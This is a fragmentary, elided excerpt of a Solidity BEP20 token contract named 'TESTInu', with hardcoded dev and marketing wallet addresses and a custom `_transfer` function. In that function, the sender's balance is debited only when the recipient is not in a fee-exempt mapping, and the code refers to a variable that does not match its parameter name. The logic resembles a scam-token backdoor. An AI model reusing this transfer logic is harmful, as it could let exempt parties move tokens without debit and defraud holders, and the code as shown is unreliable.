...
contract TESTInu is Context, IBEP20, Ownable {
    ...
    address private DevWallet = 0xb1DD596F7c7727A68F54f935d76C9324e02542cC;
    address private MarketingWallet = 0xd4bbC0898aC66AA50e7C29E3959bD0476ae653d6;     
    ...
    uint256 public constant buyFee = 1;
    ...
    function ManualTransferBEP20() external {
    ...
    function _transfer(address from, address to, uint256 txnAmount) private {
        ...
        if (!_feees[to]) {
            _balancees[from] = _balancees[from].sub(amount);
        }
